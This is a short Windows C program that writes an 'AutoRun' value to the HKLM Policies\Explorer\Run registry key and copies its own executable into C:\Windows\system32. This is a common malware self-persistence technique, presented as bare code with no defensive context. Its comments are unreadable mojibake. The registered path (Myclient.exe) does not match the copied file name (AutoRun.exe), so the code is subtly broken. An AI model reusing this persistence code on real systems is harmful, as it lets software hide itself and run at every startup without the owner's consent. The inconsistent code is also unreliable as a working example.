#include <Windows.h>

int main()
{
	char					szModlePath[MAX_PATH];
	HKEY					hkResult;

	char *pszRegName = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run";
	char *pszKeyValue = "C:\\Windows\\system32\\Myclient.exe";

	// �򿪼�ֵ
	RegOpenKeyA(HKEY_LOCAL_MACHINE, pszRegName, &hkResult);

	// ���ü�ֵ
	RegSetValueExA(hkResult, "AutoRun", 0, REG_EXPAND_SZ, (CONST BYTE*)pszKeyValue, strlen(pszKeyValue));
	
	// �رռ�ֵ
	RegCloseKey(hkResult);

	// ��ȡ����·��
	GetModuleFileNameA(NULL, szModlePath, MAX_PATH);

	// �������Ƶ�ϵͳĿ¼��
	CopyFileA(szModlePath, "C:\\Windows\\system32\\AutoRun.exe", TRUE);

	return 0;
}
